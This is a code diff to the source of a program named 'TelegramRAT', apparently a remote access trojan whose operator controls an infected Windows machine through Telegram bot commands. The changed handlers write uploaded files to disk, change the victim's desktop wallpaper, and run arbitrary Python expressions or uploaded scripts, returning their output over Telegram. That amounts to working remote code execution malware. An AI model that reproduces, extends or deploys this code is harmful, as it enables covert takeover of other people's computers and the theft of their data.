@@ -864,6 +864,11 @@ namespace TelegramRAT
                 {
                     try
                     {
+                        if (model.Files.Length == 0)
+                        {
+                            await Bot.SendTextMessageAsync(model.Message.Chat.Id, "No file or images provided.", replyToMessageId: model.Message.MessageId);
+                            return;
+                        }
                         foreach(var file in model.Files)
                         {
                             FileStream fs = new FileStream(model.Filename ?? file.FileUniqueId + ".jpg", FileMode.Create);
@@ -942,49 +947,20 @@ namespace TelegramRAT
                 Description = "Change wallpapers. Don't foreget to attach the image.",
                 Execute = async model =>
                 {
-
                     try
                     {
-                        if (model.Message.Type == MessageType.Photo)
+                        if(model.Files.Length == 0)
                         {
-                            using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
-                            {
-                                Telegram.Bot.Types.File wallpaperPhoto = Bot.GetFileAsync(model.Message.Photo.Last().FileId).Result;
-                                Bot.DownloadFileAsync(wallpaperPhoto.FilePath, fs).Wait();
-                            }
-                        }
-                        else if (model.Message.Type == MessageType.Document)
-                        {
-                            using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
-                            {
-                                Telegram.Bot.Types.File wallpaperFile = Bot.GetFileAsync(model.Message.Document.FileId).Result;
-                                Bot.DownloadFileAsync(wallpaperFile.FilePath, fs).Wait();
-                            }
-                        }
-                        else if (model.Message.ReplyToMessage != null && model.Message.ReplyToMessage.Type == MessageType.Photo)
-                        {
-                            using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
-                            {
-                                Telegram.Bot.Types.File wallpaperPhoto = Bot.GetFileAsync(model.Message.ReplyToMessage.Photo.Last().FileId).Result;
-                                Bot.DownloadFileAsync(wallpaperPhoto.FilePath, fs).Wait();
-                            }
-                        }
-                        else if (model.Message.ReplyToMessage != null && model.Message.ReplyToMessage.Type == MessageType.Document)
-                        {
-                            using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
-                            {
-                                Telegram.Bot.Types.File wallpaperFile = Bot.GetFileAsync(model.Message.ReplyToMessage.Document.FileId).Result;
-                                Bot.DownloadFileAsync(wallpaperFile.FilePath, fs).Wait();
-                            }
-                        }
-                        else
-                        {
-                            await Bot.SendTextMessageAsync(model.Message.Chat.Id, "No file or photo pinned, use /help wallpaper to get info about this command!", replyToMessageId: model.Message.MessageId);
+                            await Bot.SendTextMessageAsync(model.Message.Chat.Id, "No image or file provided.", replyToMessageId: model.Message.MessageId);
                             return;
                         }
+                        var tgfile = await Bot.GetFileAsync(model.Files.Last().FileId);
 
-                        WinAPI.SystemParametersInfo(WinAPI.SPI_SETDESKWALLPAPER, 0, Directory.GetCurrentDirectory() + "\\wllppr.png", WinAPI.SPIF_UPDATEINIFILE | WinAPI.SPIF_SENDWININICHANGE);
-                        System.IO.File.Delete("wllppr.png");
+                        using (FileStream wallpapperImageFileStream = new FileStream(Path.GetTempPath() + "wllppr.jpg", FileMode.Create))
+                            await Bot.DownloadFileAsync(tgfile.FilePath, wallpapperImageFileStream);
+                        
+                        WinAPI.SystemParametersInfo(WinAPI.SPI_SETDESKWALLPAPER, 0, Path.GetTempPath() + "wllppr.jpg", WinAPI.SPIF_UPDATEINIFILE | WinAPI.SPIF_SENDWININICHANGE);
+                        System.IO.File.Delete(Path.GetTempPath() + "wllppr.jpg");
                         await Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
                     }
                     catch (Exception ex)
@@ -1703,18 +1679,39 @@ namespace TelegramRAT
                     {
                         try
                         {
-                            if (model.Message.Type == MessageType.Document)
+                            if (model.Files.Length == 0)
                             {
-                                if (!model.Message.Document.FileName.Contains(".py"))
+                                if (model.Args.Length == 0)
                                 {
-                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "This is not a python script!", replyToMessageId: model.Message.MessageId);
+                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "Need an expression or file to execute", replyToMessageId: model.Message.MessageId);
                                     return;
                                 }
+                                MemoryStream pyOutput = new MemoryStream();
+                                var pyStream = new MemoryStream();
+                                pythonEngine.Runtime.IO.SetOutput(pyStream, Encoding.UTF8);
+
+                                pythonEngine.Execute(model.RawArgs, pythonScope);
+                                pyStream.Position = 0;
+
+                                if (pyStream.Length > 0)
+                                {
+                                    string output = string.Join(string.Empty, new StreamReader(pyStream).ReadToEnd().Take(4096).ToArray());
+                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, $"Executed! Output:\n{output}", replyToMessageId: model.Message.MessageId);
+                                }
+                                else
+                                {
+                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "Executed!", replyToMessageId: model.Message.MessageId);
+                                }
+                                pyStream.Close();
+                                return;
+                            }
+                            if (model.Filename != null && model.Filename.Contains(".py"))
+                            {
                                 MemoryStream outputStream = new MemoryStream();
                                 var scriptFileStream = System.IO.File.Create("UserScript.py");
                                 pythonEngine.Runtime.IO.SetOutput(outputStream, Encoding.UTF8);
 
-                                var file = Bot.GetFileAsync(model.Message.Document.FileId).Result;
+                                var file = Bot.GetFileAsync(model.Files[0].FileId).Result;
                                 Bot.DownloadFileAsync(file.FilePath, scriptFileStream).Wait();
                                 scriptFileStream.Close();
 
@@ -1732,62 +1729,11 @@ namespace TelegramRAT
                                 System.IO.File.Delete("UserScript.py");
                                 outputStream.Close();
                                 return;
-                            }
-                            if (model.Message.ReplyToMessage != null && model.Message.ReplyToMessage.Type == MessageType.Document)
-                            {
-                                if (!model.Message.ReplyToMessage.Document.FileName.Contains(".py"))
-                                {
-                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "This is not a python script!", replyToMessageId: model.Message.MessageId);
-                                    return;
-                                }
-                                MemoryStream outputStream = new MemoryStream();
-                                var scriptFileStream = System.IO.File.Create("UserScript.py");
-                                pythonEngine.Runtime.IO.SetOutput(outputStream, Encoding.UTF8);
-
-                                var file = Bot.GetFileAsync(model.Message.ReplyToMessage.Document.FileId).Result;
-                                Bot.DownloadFileAsync(file.FilePath, scriptFileStream).Wait();
-                                scriptFileStream.Close();
-
-                                pythonEngine.ExecuteFile("UserScript.py", pythonScope);
-
-                                outputStream.Position = 0;
-
-                                string outputText = string.Join(string.Empty, new StreamReader(outputStream).ReadToEnd().Take(4096));
-
-
-                                if (outputText.Length > 0)
-                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, $"Executed! Output: {outputText}", replyToMessageId: model.Message.MessageId);
-                                else
-                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, $"Executed!", replyToMessageId: model.Message.MessageId);
-
-                                System.IO.File.Delete("UserScript.py");
-                                outputStream.Close();
-                                return;
-                            }
-
-
-                            if (model.Args.Length < 1)
-                            {
-                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "Need an expression or file to execute", replyToMessageId: model.Message.MessageId);
-                                return;
-                            }
-                            MemoryStream pyOutput = new MemoryStream();
-                            var pyStream = new MemoryStream();
-                            pythonEngine.Runtime.IO.SetOutput(pyStream, Encoding.UTF8);
-
-                            pythonEngine.Execute(model.RawArgs, pythonScope);
-                            pyStream.Position = 0;
-
-                            if (pyStream.Length > 0)
-                            {
-                                string output = string.Join(string.Empty, new StreamReader(pyStream).ReadToEnd().Take(4096).ToArray());
-                                Bot.SendTextMessageAsync(model.Message.Chat.Id, $"Executed! Output:\n{output}", replyToMessageId: model.Message.MessageId);
                             }
                             else
                             {
-                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "Executed!", replyToMessageId: model.Message.MessageId);
+                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "This file is not a python script!", replyToMessageId: model.Message.MessageId);
                             }
-                            pyStream.Close();
 
                         }
                         catch (Exception ex)
